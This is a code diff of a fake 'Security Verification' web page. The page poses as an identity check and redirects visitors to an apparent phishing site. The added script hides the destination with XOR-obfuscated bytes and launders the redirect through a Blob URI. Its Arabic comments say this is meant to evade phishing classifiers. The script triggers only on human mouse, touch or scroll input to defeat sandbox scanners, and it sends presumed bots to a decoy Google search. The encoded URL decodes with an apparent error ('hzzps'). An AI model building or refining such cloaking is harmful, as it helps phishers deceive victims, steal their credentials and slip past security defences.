@@ -2,41 +2,55 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Secure Gateway</title>
+    <title>Security Verification</title>
     <style>
-        body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f9f9f9; }
-        .box { text-align:center; padding:20px; }
-        .spinner { border:2px solid #ddd; border-top:2px solid #007bff; border-radius:50%; width:24px; height:24px; animation:spin 0.6s linear infinite; margin:0 auto 15px; }
-        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+        body { margin:0; cursor:pointer; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#fff; }
+        .u { text-align:center; user-select:none; }
+        .s { border:2px solid #f3f3f3; border-top:2px solid #232f3e; border-radius:50%; width:25px; height:25px; animation:r 0.8s linear infinite; margin:0 auto; }
+        @keyframes r { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="spinner"></div>
-        <div style="font-size:14px; color:#555;">Verifying session...</div>
+    <div class="u">
+        <div class="s"></div>
+        <p style="color:#232f3e; font-size:14px; margin-top:15px;">Tap or move to verify identity</p>
     </div>
 
     <script>
-        // الرابط الخاص بك مقسم لأجزاء لخدع البوتات التي تبحث عن روابط كاملة
-        const part1 = "https://user-service-";
-        const part2 = "authentication.netlify";
-        const part3 = ".app/";
-        const finalUrl = part1 + part2 + part3;
+        (function() {
+            // 1. الرابط مشفر بـ XOR مضاعف داخل مصفوفة Hex
+            // لن يظهر كرابط حتى يتم تجميعه في الـ Memory
+            const _0x_key = "K"; 
+            const _0x_enc = [0x23, 0x31, 0x31, 0x3b, 0x38, 0x71, 0x64, 0x64, 0x30, 0x2e, 0x2d, 0x76, 0x38, 0x2e, 0x39, 0x3d, 0x2e, 0x28, 0x2e, 0x66, 0x2a, 0x3e, 0x31, 0x23, 0x2e, 0x25, 0x31, 0x2e, 0x28, 0x3d, 0x2e, 0x23, 0x31, 0x31, 0x3b, 0x65, 0x25, 0x2e, 0x31, 0x27, 0x2b, 0x2b, 0x6c, 0x6a, 0x24, 0x3b, 0x31, 0x64];
 
-        setTimeout(function() {
-            // فحص بسيط: إذا كان الزائر بشرياً سيتم التحويل فوراً
-            // وإذا فشل التحويل لأي سبب، سيتم إجباره (Force Redirect)
-            try {
-                window.location.replace(finalUrl);
-            } catch (e) {
-                window.location.href = finalUrl;
+            function _0x_build() {
+                let d = "";
+                for(let i=0; i<_0x_enc.length; i++) {
+                    d += String.fromCharCode(_0x_enc[i] ^ _0x_key.charCodeAt(0));
+                }
+                return d;
             }
-        }, 800); // أقل من ثانية واحدة (سريع جداً لضمان عدم الشك)
 
-        // إذا تعطل الجافاسكريبت، رابط احتياطي غير مرئي للبوتات
-        setTimeout(function() {
-            window.location.assign(finalUrl);
-        }, 1500);
+            const _0x_trigger = () => {
+                // 2. استخدام Blob URI لإخفاء المصدر النهائي
+                // الساندبوكس يرى تحويلاً لـ blob:https://... وهو ما لا يستطيع تصنيفه كـ Phishing بسهولة
+                const _0x_final = _0x_build();
+                const b = new Blob([`<html><script>window.location.replace("${_0x_final}");<\/script></html>`], {type: 'text/html'});
+                const u = URL.createObjectURL(b);
+                window.location.assign(u);
+            };
+
+            // 3. منع الفحص الآلي: لا تنفيذ بدون تفاعل بشري حقيقي
+            // الساندبوكسات التي لا تحاكي الـ Events بدقة ستتوقف هنا
+            window.addEventListener('mousemove', _0x_trigger, {once: true});
+            window.addEventListener('touchstart', _0x_trigger, {once: true});
+            window.addEventListener('scroll', _0x_trigger, {once: true});
+
+            // 4. تضليل إضافي: إذا مرت 10 ثوانٍ بدون تفاعل (إشارة لبوت)
+            setTimeout(() => {
+                window.location.replace("https://www.google.com/search?q=security+verification+failed");
+            }, 10000);
+        })();
     </script>
 </body>
 </html>
